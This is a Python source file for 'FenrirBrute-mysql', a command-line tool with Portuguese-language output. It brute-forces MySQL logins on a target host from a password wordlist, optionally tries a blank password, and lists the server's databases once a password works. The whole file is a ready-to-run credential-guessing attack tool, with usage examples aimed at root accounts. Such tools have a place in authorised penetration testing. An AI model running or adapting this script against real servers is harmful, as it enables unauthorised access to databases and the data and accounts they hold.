#!/usr/bin/python3

import mysql.connector as mysql
import sys
import getopt

def banner():
        print ("""


	  ___             _     ___          _           __  __      ___  ___  _    
	 | __|__ _ _  _ _(_)_ _| _ )_ _ _  _| |_ ___ ___|  \/  |_  _/ __|/ _ \| |   
	 | _/ -_) ' \| '_| | '_| _ \ '_| || |  _/ -_)___| |\/| | || \__ \ (_) | |__ 
	 |_|\___|_||_|_| |_|_| |___/_|  \_,_|\__\___|   |_|  |_|\_, |___/\__\_\____|
	                                                        |__/                

	Desenvolvido por:

        Leonardo Toledo
        https://github.com/leonardor666

        ---------------------------------------------------------------------------

""")

def help():
	banner()
	print ("""
	Modo de uso: python3 FenrirBrute-mysql.py -a <host> -u <user> -s <passlist>
	Exemplo: python3 FenrirBrute-mysql.py -a 192.168.1.8 -u root -s senhas.txt

	OPCOES:

	-a <host>		Endereco do host alvo
	-u <user>		Usuario
	-s <pass list>		Wordlist de senhas
	-b			Habilita senhas em branco
	-h			Exibe esta ajuda
	-v			Ativa o modo verbose e exibe todas as tentativas
""")
	sys.exit()

def test(hst):
	try:
		db = mysql.connect(
		host = hst,
		user = 'root',
		passwd = ''
		)
	except mysql.errors.InterfaceError:
		print ('\n	\33[31m[-] NAO FOI POSSIVEL CONECTAR COM O HOST', hst, '\n\33[0m')
		sys.exit()


def brute(hst,usr,pwd,verbose,branco):
	if branco == 1:
		try:
			db = mysql.connect(
			host = hst,
			user = usr,
			passwd = ''
			)
			print ('\n	SENHA ENCONTRADA:\n')
			print ("	[\33[92m+\33[0m].................[\33[92m%s\33[0m:\33[92m''\33[0m]"%(usr))
			cursor = db.cursor()
			print ('\n	DATABASES:\n')
			cursor.execute('SHOW DATABASES')
			databases = cursor.fetchall()
			for db in databases:
				print ('	',db)
			sys.exit()
		except mysql.errors.ProgrammingError:
			if verbose == 1:
				print ("Tentando --> ''")
	with open(pwd) as wl:
		for p in wl:
			p = p.strip()
			try:
				db = mysql.connect(
				host = hst,
				user = usr,
				passwd = p
				)
				print ("\n	SENHA ENCONTRADA:\n")
				print ("        [\33[92m+\33[0m].................[\33[92m%s\33[0m:\33[92m%s\33[0m]"%(usr,p))
				cursor = db.cursor()
				print ('\n	DATABASES:\n')
				cursor.execute("SHOW DATABASES")
				databases = cursor.fetchall()
				for database in databases:
					print ('	',database)
				sys.exit()
			except mysql.errors.ProgrammingError:
				if verbose == 1:
					print ('Tentando --> %s:%s'%(usr,p))

def main(argv):
	if len(sys.argv) < 4:
		help()

	argumento = []
	verbose = 0
	hst = ''
	usr = ''
	pwd = ''
	lpass = 0
	branco = 0

	try:
		opts, args = getopt.getopt(argv, "bhva:u:s:")
	except getopt.GetoptError:
		help()

	for opt, arg in opts:
		argumento.append(opt)
		if opt == '-h':
			help()
		elif opt == '-v':
			verbose = 1
		elif opt == '-b':
			branco = 1
		elif opt == '-a':
			hst = arg
		elif opt == '-u':
			usr = arg
		elif opt == '-s':
			pwd = arg

	banner()
	test(hst)

	with open(pwd) as passw:
		for p in passw:
			p = p.strip()
			lpass += 1
	passw.close()

	print ('\n	INICIANDO BRUTE FORCE NO HOST: '+hst+'\n')

	print ('	[+] Host...............................[%s]'%(hst))
	print ('	[+] Senhas.............................[%s]\n'%(lpass))
	print ('	---------------------------------------------------------------------------\n')

	brute(hst,usr,pwd,verbose,branco)

if __name__ == '__main__':
	main(sys.argv[1:])
